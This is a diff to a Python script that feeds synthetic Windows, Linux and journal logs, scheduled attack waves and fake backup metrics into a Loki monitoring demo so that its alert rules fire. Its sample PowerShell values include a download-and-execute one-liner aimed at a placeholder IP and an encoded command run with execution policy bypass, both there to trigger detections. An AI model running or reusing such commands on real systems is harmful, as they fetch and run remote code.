@@ -14,6 +14,8 @@ omitempty fields, compact separators, and <, >, & written as \u003c, \u003e,
 Linux lines: raw text, as loki.source.file tails it. The stages of the
 loki.process chain run on every line; labels they extract join the stream.
 
+Journal lines (loki.source.journal): the bare MESSAGE text, with no syslog prefix and no JSON.
+
 Deliberate deviation from production: Alloy stamps entries with arrival time.
 The feeder backfills --span-hours so trends are visible on first start, and
 timeCreated carries the same instant as the Loki entry.
@@ -22,7 +24,9 @@ Stdlib only.
   python feeder.py --check                  validate parsing and coverage (default)
   python feeder.py --dump FILE              write NDJSON {stream, ts, line}
   python feeder.py --loki http://HOST:3100  push the backfill to Loki
-  add --follow SECONDS to keep pushing one fresh line per source every tick
+  add --follow SECONDS to keep pushing calm traffic, with an attack wave every --wave-minutes
+  python feeder.py --loki URL --scenario spray|admin|persistence|ad|logclear|ssh|all   one wave now
+  --prom-dir DIR writes demo backup metrics (one healthy host, one stale) for node_exporter
 """
 
 from __future__ import annotations
@@ -44,21 +48,29 @@ from xml.sax.saxutils import escape as xml_escape
 REPO = Path(__file__).resolve().parents[2]
 
 # Demo hostname for each production config. The configs' env("COMPUTERNAME") and
-# env("HOSTNAME") resolve to these values.
+# env("HOSTNAME") resolve to these values. The third field keeps one source kind:
+# the server config is replayed for its journal alone, because its file sources
+# have no demo templates.
 CONFIGS = [
-    ("DEMO-DC01", "windows-server-2025/config.alloy"),
-    ("DEMO-WS01", "windows-11-client/config.alloy"),
-    ("DEMO-LNX01", "linux-agent/config.alloy"),
+    ("DEMO-DC01", "windows-server-2025/config.alloy", None),
+    ("DEMO-WS01", "windows-11-client/config.alloy", None),
+    ("DEMO-LNX01", "linux-agent/config.alloy", None),
+    ("DEMO-SRV01", "server/alloy/config.alloy", "loki.source.journal"),
 ]
 
 # ---------------------------------------------------------------- Alloy parsing
 
 BLOCK = re.compile(
-    r'(?m)^(loki\.source\.windowsevent|loki\.source\.file|local\.file_match|loki\.process)'
+    r'(?m)^(loki\.source\.windowsevent|loki\.source\.file|loki\.source\.journal'
+    r'|local\.file_match|loki\.process)'
     r'\s+"([^"]+)"\s*\{'
 )
 STR = r'"((?:[^"\\]|\\.)*)"'
-LABEL = re.compile(r'([A-Za-z_]\w*)\s*=\s*(?:env\("(\w+)"\)|' + STR + r')')
+# constants.hostname is the Alloy constant the server config uses for its journal instance.
+LABEL = re.compile(
+    r'(?P<key>[A-Za-z_]\w*)\s*=\s*(?:env\("(?P<env>\w+)"\)|(?P<const>constants\.hostname)'
+    r'|"(?P<str>(?:[^"\\]|\\.)*)")'
+)
 STAGE = re.compile(r'\bstage\.(\w+)\s*\{')
 
 
@@ -129,18 +141,20 @@ def list_items(text: str) -> list[str]:
 def label_map(text: str, host: str) -> dict[str, str]:
     out: dict[str, str] = {}
     for m in LABEL.finditer(text):
-        if m.group(2):
-            if m.group(2) not in ("COMPUTERNAME", "HOSTNAME"):
-                raise SystemExit(f"unknown env() in config: {m.group(2)}")
-            out[m.group(1)] = host
+        if m.group("env"):
+            if m.group("env") not in ("COMPUTERNAME", "HOSTNAME"):
+                raise SystemExit(f"unknown env() in config: {m.group('env')}")
+            out[m.group("key")] = host
+        elif m.group("const"):
+            out[m.group("key")] = host
         else:
-            out[m.group(1)] = unescape(m.group(3))
+            out[m.group("key")] = unescape(m.group("str"))
     return out
 
 
 @dataclass
 class Stage:
-    kind: str                                   # "regex" | "labels"
+    kind: str                                   # "regex" | "labels" | "static"
     expression: str = ""
     labels: dict = field(default_factory=dict)  # stream label -> regex group name
 
@@ -156,6 +170,9 @@ def parse_stages(body: str) -> list[Stage]:
             values = attr_block(inner, "values", "{") or ""
             pairs = re.findall(r'([A-Za-z_]\w*)\s*=\s*"([^"]*)"', values)
             stages.append(Stage("labels", labels={k: (g or k) for k, g in pairs}))
+        elif m.group(1) == "static_labels":
+            values = attr_block(inner, "values", "{") or ""
+            stages.append(Stage("static", labels=dict(re.findall(r'([A-Za-z_]\w*)\s*=\s*"([^"]*)"', values))))
         else:
             raise SystemExit(f"unsupported loki.process stage stage.{m.group(1)}; extend stage_labels()")
     return stages
@@ -180,7 +197,7 @@ def resolve_stages(body: str, procs: dict[str, str]) -> list[Stage]:
 @dataclass
 class Source:
     name: str
-    kind: str                                    # "windowsevent" | "file"
+    kind: str                                    # "windowsevent" | "file" | "journal"
     labels: dict = field(default_factory=dict)   # windowsevent stream labels
     stages: list = field(default_factory=list)
     channel: str = ""
@@ -195,7 +212,7 @@ class Host:
     record_seq: int = 1000                       # Windows EventRecordID counter
 
 
-def load_sources(text: str, host: str) -> list[Source]:
+def load_sources(text: str, host: str, only: str | None = None) -> list[Source]:
     blocks = []
     for m in BLOCK.finditer(text):
         at = m.end() - 1
@@ -204,6 +221,8 @@ def load_sources(text: str, host: str) -> list[Source]:
     file_matches = {n: b for kind, n, b in blocks if kind == "local.file_match"}
     sources: list[Source] = []
     for kind, name, body in blocks:
+        if only and kind != only:
+            continue
         if kind == "loki.source.windowsevent":
             sources.append(Source(
                 name, "windowsevent",
@@ -225,16 +244,22 @@ def load_sources(text: str, host: str) -> list[Source]:
                 labels.pop("__path_exclude__", None)
                 files.append((path, labels))
             sources.append(Source(name, "file", stages=resolve_stages(body, procs), files=files))
+        elif kind == "loki.source.journal":
+            sources.append(Source(
+                name, "journal",
+                labels=label_map(attr_block(body, "labels", "{") or "", host),
+                stages=resolve_stages(body, procs),
+            ))
     return sources
 
 
 def load_hosts(repo: Path) -> list[Host]:
     hosts = []
-    for name, rel in CONFIGS:
+    for name, rel, only in CONFIGS:
         path = repo / rel
         if not path.is_file():
             raise SystemExit(f"missing production config: {path}")
-        hosts.append(Host(name, load_sources(path.read_text(encoding="utf-8"), name)))
+        hosts.append(Host(name, load_sources(path.read_text(encoding="utf-8"), name, only)))
     return hosts
 
 
@@ -506,7 +531,13 @@ def context(rng: random.Random, ts: datetime, host: str) -> dict:
         "guid": "{" + str(uuid.UUID(int=rng.getrandbits(128), version=4)).upper() + "}",
         "service": rng.choice(["DemoSvc", "DemoAgent"]),
         "service_image": r"C:\Windows\Temp\demosvc.exe",
-        "task": r"\DemoUpdate\CleanTemp", "script": r"Get-ChildItem C:\Users",
+        "task": r"\DemoUpdate\CleanTemp",
+        # Mostly routine; sometimes the kind of script the PowerShell rules look for.
+        "script": rng.choice([r"Get-ChildItem C:\Users", r"Get-Service | Where-Object Status -eq Running",
+                              r"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
+                              r"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"]),
+        "dport": rng.choice(["443", "443", "443", "53", "445", "3389", "5985", "4444"]),
+        "share": rng.choice([r"\\*\SYSVOL", r"\\*\SYSVOL", r"\\*\ADMIN$", r"\\*\C$", r"\\*\IPC$"]),
         "file": r"C:\Users\alice\Documents\report.xlsx", "dst_ip": rng.choice(ATTACKER_IPS),
         "domain": "example.org", "utc": f"{ts:%Y-%m-%d %H:%M:%S}.{ts.microsecond // 1000:03d}",
     }
@@ -535,8 +566,8 @@ def field_value(name: str, c: dict) -> str:
         "ScriptBlockId": c["guid"], "ContextInfo": "Get-ChildItem",
         "PrivilegeList": "SeDebugPrivilege", "ObjectServer": "Security", "ObjectType": "File",
         "ObjectName": c["file"], "TargetFilename": c["file"], "AccessMask": "0x2",
-        "ShareName": r"\\*\SYSVOL", "ShareLocalPath": r"C:\Windows\SYSVOL\sysvol", "RelativeTargetName": "report.xlsx",
-        "DestinationIp": c["dst_ip"], "DestinationPort": "443", "DestinationHostname": c["domain"],
+        "ShareName": c["share"], "ShareLocalPath": r"C:\Windows\SYSVOL\sysvol", "RelativeTargetName": "report.xlsx",
+        "DestinationIp": c["dst_ip"], "DestinationPort": c["dport"], "DestinationHostname": c["domain"],
         "Protocol": "tcp", "QueryName": c["domain"], "QueryStatus": "0",
         "QueryResults": c["dst_ip"], "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DemoUpdater",
         "Details": c["image"], "ObjectDN": f"CN={c['user']},OU=Staff,DC=demo,DC=local",
@@ -636,6 +667,158 @@ def linux_line(job: str, host: str, path: str, ts: datetime, rng: random.Random)
                 f'server: _, request: "GET {rng.choice(PATHS)} HTTP/1.1", host: "demo.local"')
     raise SystemExit(f"no demo template for linux job {job!r}; extend linux_line()")
 
+# ------------------------------------------------------------ journal messages
+# loki.source.journal delivers the bare MESSAGE field. Each template is one shape that
+# the dashboards and alerts match on. build() emits --per-journal lines of every
+# template, so coverage does not depend on random choice.
+
+IPV6_ATTACKER = "2001:db8::50"
+
+
+def journal_failed(rng: random.Random) -> str:
+    who = rng.choice([rng.choice(USERS)[0], "invalid user bob"])
+    return f"Failed password for {who} from {rng.choice(ATTACKER_IPS)} port {rng.randint(40000, 65000)} ssh2"
+
+
+def journal_failed_key(rng: random.Random) -> str:
+    return (f"Failed publickey for {rng.choice(USERS)[0]} from {rng.choice(ATTACKER_IPS)} "
+            f"port {rng.randint(40000, 65000)} ssh2")
+
+
+def journal_invalid(rng: random.Random) -> str:
+    return f"Invalid user admin from {rng.choice(ATTACKER_IPS)} port {rng.randint(40000, 65000)}"
+
+
+def journal_accepted(rng: random.Random) -> str:
+    method = rng.choice(["publickey", "password"])
+    return (f"Accepted {method} for {rng.choice(USERS)[0]} from {rng.choice(INTERNAL_IPS)} "
+            f"port {rng.randint(40000, 65000)} ssh2")
+
+
+def journal_sudo(rng: random.Random) -> str:
+    user = rng.choice(USERS)[0]
+    return f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/id"
+
+
+def journal_cron(rng: random.Random) -> str:
+    return "(root) CMD (/usr/bin/true)"
+
+
+def journal_useradd(rng: random.Random) -> str:
+    return f"new user: name={rng.choice(['demo', 'intern'])}, UID=1001, GID=1001, home=/home/demo, shell=/bin/bash"
+
+
+def journal_pam(rng: random.Random) -> str:
+    return (f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
+            f"rhost={rng.choice(ATTACKER_IPS + [IPV6_ATTACKER])} user={rng.choice(USERS)[0]}")
+
+
+def journal_segfault(rng: random.Random) -> str:
+    return f"demo-app[{rng.randint(1000, 60000)}]: segfault at 0 ip 00007f3a2c1d0b2e sp 00007ffd1 error 4"
+
+
+JOURNAL_TEMPLATES = [journal_failed, journal_failed_key, journal_invalid, journal_accepted,
+                     journal_sudo, journal_cron, journal_useradd, journal_pam, journal_segfault]
+
+
+# ------------------------------------------------------------- scenario waves
+
+# Events the alert rules react to. The steady feed leaves them out; a wave pushes them
+# in one burst, so alerts fire after a wave and resolve in between, as in real life.
+WAVE_IDS = {1102, 4720, 4732, 4728, 4756, 7045, 4698, 5136, 5137, 5141, 4625, 4740, 5001, 4104}
+WAVE_JOURNAL = {journal_failed, journal_failed_key, journal_invalid, journal_pam, journal_useradd, journal_sudo}
+SCENARIOS = ("spray", "admin", "persistence", "ad", "logclear", "ssh", "all")
+
+
+def wave(hosts: list[Host], rng: random.Random, now: datetime, scenario: str = "all") -> dict:
+    """One attack wave. Every line keeps the production shape and labels."""
+    streams: dict[tuple, list] = {}
+    pick = {
+        "spray": {4625: 25, 4740: 1},
+        "admin": {4720: 1, 4732: 1, 4728: 1},
+        "persistence": {7045: 1, 4698: 1, 4104: 2},
+        "ad": {5136: 2, 5137: 1, 5141: 1},
+        "logclear": {1102: 1},
+    }
+    wanted: dict[int, int] = {}
+    for name, ids in pick.items():
+        if scenario in (name, "all"):
+            wanted.update(ids)
+
+    def add(labels: dict, ts: datetime, line: str):
+        streams.setdefault(tuple(sorted(labels.items())), []).append((ts, line))
+
+    for host in hosts:
+        for src in host.sources:
+            if src.kind == "windowsevent":
+                for eid, tpl in win_targets(src):
+                    for i in range(wanted.get(eid, 0)):
+                        ts = now - timedelta(seconds=i * 2 + rng.random())
+                        host.record_seq += 1
+                        line = windows_line(host.name, src.channel, eid, tpl, ts, host.record_seq, rng)
+                        add(stage_labels(src.labels, src.stages, line), ts, line)
+            elif src.kind == "journal" and scenario in ("ssh", "all"):
+                burst = [journal_failed] * 15 + [journal_invalid] * 5 + [journal_pam] * 5 + [journal_sudo] * 6
+                burst += [journal_useradd]
+                for i, tpl in enumerate(burst):
+                    ts = now - timedelta(seconds=i + rng.random())
+                    line = tpl(rng)
+                    add(stage_labels(src.labels, src.stages, line), ts, line)
+    for key in streams:
+        streams[key].sort(key=lambda e: e[0])
+    return streams
+
+
+# ------------------------------------------------------------ posture metrics
+
+def write_posture(prom_dir: Path, now: datetime) -> None:
+    """Backup metrics in the names posture/backup scripts write for the node_exporter textfile
+    collector: one host healthy, one with a stale backup and an overdue restore test."""
+    t = int(now.timestamp())
+    hosts = {"DEMO-SRV01": (t - 2 * 3600, t - 10 * 86400), "DEMO-LNX01": (t - 3 * 86400, t - 120 * 86400)}
+    body = ["# HELP backup_last_success_timestamp_seconds Unix time of the last successful backup run.",
+            "# TYPE backup_last_success_timestamp_seconds gauge"]
+    body += [f'backup_last_success_timestamp_seconds{{job="restic",host="{h}"}} {b}' for h, (b, _) in hosts.items()]
+    body += ["# HELP backup_last_restore_test_timestamp_seconds Unix time of the last successful restore test.",
+             "# TYPE backup_last_restore_test_timestamp_seconds gauge"]
+    body += [f'backup_last_restore_test_timestamp_seconds{{job="restic",host="{h}"}} {r}' for h, (_, r) in hosts.items()]
+    prom_dir.mkdir(parents=True, exist_ok=True)
+    tmp = prom_dir / ".demo_backup.prom.tmp"
+    tmp.write_text("\n".join(body) + "\n", encoding="utf-8")
+    tmp.replace(prom_dir / "demo_backup.prom")
+
+
+# ------------------------------------------------------ Windows stand-in metrics
+
+START = time.time()
+
+
+def write_windows_metrics(prom_dir: Path) -> None:
+    """windows_exporter-shaped metrics for one demo Windows host (DEMO-WS01): counters grow with
+    time so rate() works; the Defender service is stopped, so WindowsDefenderDisabled fires."""
+    up = time.time() - START
+    lines = []
+    def g(name: str, labels: str, value: float, kind: str = "gauge"):
+        if not any(l.startswith(f"# TYPE {name} ") for l in lines):
+            lines.append(f"# TYPE {name} {kind}")
+        lines.append(f"{name}{{{labels}}} {value:.0f}")
+    for core in ("0,0", "0,1"):
+        for mode, share in (("idle", 0.78), ("user", 0.15), ("privileged", 0.07)):
+            g("windows_cpu_time_total", f'core="{core}",mode="{mode}"', 1e6 + up * share, "counter")
+    g("windows_memory_physical_total_bytes", "", 16 * 2**30)
+    g("windows_memory_physical_free_bytes", "", (6.5 + (up % 600) / 600) * 2**30)
+    g("windows_logical_disk_size_bytes", 'volume="C:"', 256 * 2**30)
+    g("windows_logical_disk_free_bytes", 'volume="C:"', 41 * 2**30)
+    g("windows_net_bytes_received_total", 'nic="Ethernet"', 5e9 + up * 180_000, "counter")
+    g("windows_net_bytes_sent_total", 'nic="Ethernet"', 2e9 + up * 60_000, "counter")
+    for svc, running in (("WinDefend", 0), ("mpssvc", 1), ("EventLog", 1), ("wuauserv", 1), ("Dnscache", 1)):
+        g("windows_service_state", f'name="{svc}",state="running"', running)
+        g("windows_service_state", f'name="{svc}",state="stopped"', 1 - running)
+    prom_dir.mkdir(parents=True, exist_ok=True)
+    tmp = prom_dir / ".demo_windows.prom.tmp"
+    tmp.write_text("\n".join(l.replace("{}", "") for l in lines) + "\n", encoding="utf-8")
+    tmp.replace(prom_dir / "demo_windows.prom")
+
 
 # ------------------------------------------------------ stages, build, outputs
 
@@ -647,6 +830,8 @@ def stage_labels(labels: dict, stages: list[Stage], line: str) -> dict:
         if st.kind == "regex":
             m = re.search(st.expression, line)
             groups = m.groupdict() if m else {}
+        elif st.kind == "static":
+            out.update(st.labels)
         else:
             for label, group in st.labels.items():
                 value = groups.get(group)
@@ -660,7 +845,8 @@ def ns(ts: datetime) -> int:
 
 
 def build(hosts: list[Host], rng: random.Random, now: datetime, span_s: float, per_id: int,
-          per_file: int) -> tuple[dict, dict]:
+          per_file: int, per_journal: int, calm: bool = False) -> tuple[dict, dict]:
+    """calm=True leaves out the events that alert rules react to; waves add them on schedule."""
     streams: dict[tuple, list] = {}
     cover: dict[tuple, dict] = {}
 
@@ -672,6 +858,8 @@ def build(hosts: list[Host], rng: random.Random, now: datetime, span_s: float, p
             if src.kind == "windowsevent":
                 cov = cover.setdefault((host.name, src.name), {"ids": set(), "levels": set()})
                 for eid, tpl in win_targets(src):
+                    if calm and eid in WAVE_IDS:
+                        continue
                     cov["ids"].add(eid)
                     cov["levels"].add(tpl.level)
                     for _ in range(per_id):
@@ -679,8 +867,18 @@ def build(hosts: list[Host], rng: random.Random, now: datetime, span_s: float, p
                         host.record_seq += 1
                         line = windows_line(host.name, src.channel, eid, tpl, ts, host.record_seq, rng)
                         add(stage_labels(src.labels, src.stages, line), ts, line)
+            elif src.kind == "journal":
+                for tpl in JOURNAL_TEMPLATES:
+                    if calm and tpl in WAVE_JOURNAL:
+                        continue
+                    for _ in range(per_journal):
+                        ts = now - timedelta(seconds=rng.random() * span_s)
+                        line = tpl(rng)
+                        add(stage_labels(src.labels, src.stages, line), ts, line)
             else:
                 for path, labels in src.files:
+                    if calm and labels.get("job") in ("auth", "secure"):
+                        continue  # auth files carry failures and sudo; waves add them
                     for _ in range(per_file):
                         ts = now - timedelta(seconds=rng.random() * span_s)
                         line = linux_line(labels["job"], host.name, path, ts, rng)
@@ -707,10 +905,17 @@ def check(hosts: list[Host], streams: dict, cover: dict) -> int:
             if not ids and not levels and not cov["ids"]:
                 problems.append(f"{host.name}/{src.name}: any-event sample missing")
 
+    for host in hosts:
+        for src in host.sources:
+            if src.kind == "journal" and not any(dict(k).get("instance") == host.name for k in streams):
+                problems.append(f"{host.name}/{src.name}: no journal stream with instance {host.name}")
+
     lines = 0
     for key, entries in streams.items():
         labels = dict(key)
-        for col in ("job", "host", "os_type", "category", "severity"):
+        required = (("job", "instance", "source") if labels.get("job") == "systemd-journal"
+                    else ("job", "host", "os_type", "category", "severity"))
+        for col in required:
             if col not in labels:
                 problems.append(f"{labels.get('job', '?')}: stream without label {col}")
         if "action" in labels and labels["action"] not in ("Ban", "Unban"):
@@ -762,7 +967,10 @@ def push(base: str, streams: dict, batch: int = 1000) -> int:
                 with urllib.request.urlopen(req, timeout=60) as resp:
                     resp.read()
             except urllib.error.HTTPError as e:
-                raise SystemExit(f"loki push failed for {labels}: {e.code} {e.read().decode(errors='replace')}")
+                detail = e.read().decode(errors="replace")
+                if e.code == 400 and "too far behind" in detail:
+                    continue  # a restart re-sends the backfill; Loki keeps what it already has
+                raise SystemExit(f"loki push failed for {labels}: {e.code} {detail}")
             sent += len(values)
     return sent
 
@@ -776,30 +984,55 @@ def main() -> int:
     ap.add_argument("--span-hours", type=float, default=24.0, help="backfill window")
     ap.add_argument("--per-id", type=int, default=4, help="lines per Windows EventID target")
     ap.add_argument("--per-file", type=int, default=40, help="lines per Linux file target")
+    ap.add_argument("--per-journal", type=int, default=10, help="lines per journal message template")
     ap.add_argument("--seed", type=int, default=1)
-    ap.add_argument("--follow", type=float, metavar="SECONDS", help="keep pushing one line per target")
+    ap.add_argument("--follow", type=float, metavar="SECONDS", help="keep pushing calm traffic every SECONDS")
+    ap.add_argument("--wave-minutes", type=float, default=15.0, help="with --follow: attack wave interval")
+    ap.add_argument("--scenario", choices=SCENARIOS, help="push one attack wave now and exit")
+    ap.add_argument("--prom-dir", type=Path, help="write demo backup metrics for the textfile collector")
+    ap.add_argument("--win-prom-dir", type=Path, help="write windows_exporter-shaped metrics for a demo host")
     args = ap.parse_args()
 
     rng = random.Random(args.seed)
     hosts = load_hosts(args.repo)
     now = datetime.now(timezone.utc)
-    streams, cover = build(hosts, rng, now, args.span_hours * 3600, args.per_id, args.per_file)
 
-    if not (args.dump or args.loki or args.follow):
+    if args.scenario:
+        if not args.loki:
+            raise SystemExit("--scenario needs --loki")
+        print(f"wave {args.scenario}: {push(args.loki, wave(hosts, rng, now, args.scenario))} lines")
+        return 0
+
+    streams, cover = build(hosts, rng, now, args.span_hours * 3600, args.per_id, args.per_file, args.per_journal)
+    if not (args.dump or args.loki or args.follow or args.prom_dir or args.win_prom_dir):
         return check(hosts, streams, cover)
+    if args.prom_dir:
+        write_posture(args.prom_dir, now)
+        print(f"posture metrics: {args.prom_dir / 'demo_backup.prom'}")
+    if args.win_prom_dir:
+        write_windows_metrics(args.win_prom_dir)
     if args.dump:
         write_dump(args.dump, streams)
         print(f"dump ok: {args.dump}")
     if args.loki:
-        print(f"backfill pushed: {push(args.loki, streams)} lines")
+        print(f"backfill pushed: {push(args.loki, streams)} lines", flush=True)
     if args.follow:
         if not args.loki:
             raise SystemExit("--follow needs --loki")
+        print(f"wave all: {push(args.loki, wave(hosts, rng, datetime.now(timezone.utc)))} lines", flush=True)
+        next_wave = time.monotonic() + args.wave_minutes * 60
         while True:
             time.sleep(args.follow)
             now = datetime.now(timezone.utc)
-            live, _ = build(hosts, rng, now, 0, 1, 1)
+            live, _ = build(hosts, rng, now, 0, 1, 1, 1, calm=True)
             push(args.loki, live)
+            if args.prom_dir:
+                write_posture(args.prom_dir, now)
+            if args.win_prom_dir:
+                write_windows_metrics(args.win_prom_dir)
+            if time.monotonic() >= next_wave:
+                print(f"wave all: {push(args.loki, wave(hosts, rng, now))} lines", flush=True)
+                next_wave = time.monotonic() + args.wave_minutes * 60
     return 0
 
 
